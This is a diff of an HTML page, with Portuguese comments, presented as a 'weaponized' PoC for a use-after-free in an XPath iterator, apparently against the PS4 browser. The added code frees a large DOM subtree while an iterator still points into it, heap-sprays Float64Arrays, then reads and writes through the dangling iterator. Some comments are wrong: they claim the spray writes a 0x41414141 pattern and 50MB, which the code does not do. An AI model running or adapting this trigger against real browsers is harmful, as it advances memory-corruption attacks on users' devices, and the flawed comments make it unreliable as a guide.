@@ -1,74 +1,142 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 </title>
+<title>PS4 PoC: XPath UAF Weaponized</title>
+<style>
+    body { background-color: #111; color: #fff; font-family: monospace; padding: 20px; }
+    button { 
+        font-size: 20px; padding: 15px 30px; 
+        background: #c00; color: #fff; border: 2px solid #fff; 
+        cursor: pointer; margin-bottom: 20px;
+    }
+    #log { 
+        border: 1px solid #0f0; background: #000; 
+        padding: 10px; height: 300px; overflow-y: scroll; 
+        white-space: pre-wrap; font-size: 14px;
+    }
+    .status-safe { color: #0f0; }
+    .status-danger { color: #f00; font-weight: bold; font-size: 1.2em; }
+    .status-warn { color: #ffa500; }
+</style>
 </head>
 <body>
 
-<h1>SUITE V70000: MAX CAPACITY</h1>
-<hr>
+<h1>TESTE 35: XPATH ITERATOR UAF (ARMADO)</h1>
+<p>Este teste cria um container isolado, cria um iterador sobre ele, destrói o container e tenta preencher a memória liberada com lixo (Heap Spray) antes de usar o iterador novamente.</p>
 
+<button onclick="runWeaponizedT35()">INICIAR EXPLORAÇÃO</button>
 
-    
-<button onclick="t35_weaponized()">35. XPath Evaluator Iterator Invalid</button>
-
-    
+<div id="log">Aguardando execução...</div>
 
 <script>
-
+    const L = document.getElementById('log');
     
-    function t35_weaponized() {
-    log("Iniciando XPath Iterator UAF (Armado)...");
-    
-    // 1. Cria um container isolado (para não apagar seus botões)
-    const sandbox = document.createElement('div');
-    // Cria uma estrutura profunda para o iterador percorrer
-    sandbox.innerHTML = "<div><span><b><i>ALVO</i></b></span></div>".repeat(500);
-    document.body.appendChild(sandbox);
-
-    // 2. Cria o iterador apontando para elementos DENTRO do sandbox
-    // XPath procura por todas as tags <i>
-    const r = document.evaluate("//i", sandbox, null, XPathResult.UNORDERED_NODE_ITERATOR_TYPE, null);
-    
-    // Avança um pouco para "aquecer" o iterador
-    let node = r.iterateNext(); 
-    
-    // 3. O GATILHO: Destruição total do alvo
-    // Remove o sandbox do DOM
-    sandbox.remove();
-    // Limpa o HTML para forçar o Garbage Collector a marcar os nós como livres
-    sandbox.innerHTML = ""; 
-    
-    // 4. HEAP SPRAY (Tenta sobrescrever a memória que acabou de ser liberada)
-    // Se o iterador ainda apontar para o endereço antigo, ele agora apontará para este array
-    const spray = new Array(50000).fill(1.1); // Float arrays são ótimos para isso
-    
-    try {
-        // 5. O ACESSO: Tenta avançar o iterador em uma árvore morta e sobrescrita
-        const zombie = r.iterateNext();
-        
-        if (zombie) {
-            // Se retornou algo, tentamos acessar propriedades para causar o Segfault
-            log("PERIGO: Iterador retornou um nó Zumbi!");
-            log("Conteúdo: " + zombie.textContent); // <--- Aqui deve dar Crash se for UAF
-            zombie.textContent = "Crash"; 
-        } else {
-            log("Iterador invalidado com segurança (Retornou null).");
-        }
-    } catch(e) {
-        // Se der erro de JS, o navegador se protegeu
-        log("Browser Safe: " + e.message);
+    function log(msg, type = '') {
+        const line = document.createElement('div');
+        line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+        if(type) line.className = type;
+        L.appendChild(line);
+        L.scrollTop = L.scrollHeight;
     }
-}
+
+    function runWeaponizedT35() {
+        L.innerHTML = ""; // Limpa log anterior
+        log("1. Inicializando Sandbox...", "status-warn");
+
+        // 1. Criação do Sandbox (Isolado do Body principal para não apagar o log)
+        const sandbox = document.createElement('div');
+        sandbox.id = "sandbox-target";
         
+        // Cria estrutura DOM profunda para o iterador "gostar"
+        // Usamos tags <i> com atributos para ocupar memória
+        let content = "";
+        for(let i=0; i<2000; i++) {
+            content += `<i id="n${i}" data-val="${Math.random()}">Nó ${i}</i>`;
+        }
+        sandbox.innerHTML = content;
+        document.body.appendChild(sandbox);
         
-    
-    
+        log("2. Criando XPath Iterator (apontando para memória do Sandbox)...");
+        
+        // Cria o iterador instável
+        const iterator = document.evaluate(
+            "//i",                  // Seleciona todos os <i>
+            sandbox,                // Contexto é o sandbox
+            null, 
+            XPathResult.UNORDERED_NODE_ITERATOR_TYPE, 
+            null
+        );
+
+        // "Aquece" o iterador movendo o ponteiro interno
+        const firstNode = iterator.iterateNext();
+        log(`   -> Iterador ativo. Primeiro nó: ${firstNode.id}`);
+
+        // 3. O GATILHO: Destruição
+        log("3. DESTRUINDO O SANDBOX (Free)...", "status-danger");
+        
+        // Remove do DOM
+        sandbox.remove();
+        // Limpa referências internas para encorajar o Garbage Collector
+        sandbox.textContent = ""; 
+        
+        // 4. HEAP SPRAY (Tenta ocupar o espaço liberado imediatamente)
+        log("4. EXECUTANDO HEAP SPRAY (Fill)...");
+        
+        const sprayStore = [];
+        try {
+            // Tenta alocar 50MB de floats repetidos (padrão 0x414141...)
+            // Se o iterador ler isso como ponteiro, vai crashar tentando pular para 0x41414141
+            for(let i=0; i<1000; i++) {
+                const b = new Float64Array(1024);
+                b.fill(1.1); // Padrão de bits específico
+                sprayStore.push(b);
+            }
+        } catch(e) {
+            log("   [!] Erro no Spray (memória cheia?): " + e.message);
+        }
+
+        // Pequeno delay para permitir que o GC rode (se possível)
+        log("   -> Aguardando sincronização de memória (50ms)...");
+        
+        setTimeout(() => {
+            log("5. ACESSANDO O ITERADOR ZUMBI (Use)...", "status-danger");
+            
+            try {
+                // Tenta avançar o iterador que aponta para o DOM destruído
+                const zombie = iterator.iterateNext();
+                
+                if (zombie) {
+                    // Se chegamos aqui, o navegador retornou um objeto.
+                    // Vamos tentar acessar propriedades para ver se a memória está corrompida.
+                    log("   [!!!] O Iterador retornou um nó!", "status-danger");
+                    
+                    // Teste de leitura (pode crashar aqui)
+                    const id = zombie.id;
+                    log(`   Leitura ID: ${id}`);
+                    
+                    // Teste de escrita (pode crashar aqui)
+                    zombie.textContent = "CRASH_TEST";
+                    log("   Escrita realizada sem crash imediato.");
+                    
+                    if(document.body.contains(zombie)) {
+                        log("   [Resultado] O nó ainda existe no DOM? Sim (Falha na destruição).", "status-safe");
+                    } else {
+                        log("   [Resultado] O nó NÃO está no DOM, mas ainda existe na memória (Dangling Pointer potencial).", "status-warn");
+                    }
+                } else {
+                    log("   [Resultado] O Iterador retornou null (Comportamento Seguro).", "status-safe");
+                }
+            } catch(e) {
+                log("   [Exceção] O navegador bloqueou o acesso: " + e.message, "status-safe");
+            }
+            
+            // Cleanup para não travar o navegador se sobreviveu
+            sprayStore.length = 0;
+            
+        }, 50);
+    }
 </script>
+
 </body>
 </html>
-
-
-
